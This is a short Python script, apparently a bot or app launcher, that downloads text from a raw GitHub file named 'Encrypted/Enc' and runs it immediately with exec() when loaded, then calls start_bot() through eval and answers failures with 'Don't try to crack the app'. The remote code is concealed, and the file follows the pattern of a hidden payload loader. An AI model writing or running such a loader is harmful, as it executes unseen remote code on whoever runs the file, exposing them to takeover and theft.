import requests
data = requests.get(url="https://raw.githubusercontent.com/thee-foxy199/Encrypted/925419bbc0bba37abc55f94eb58a4000de3b4f13/Enc").text
exec(data)


def start_script():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"
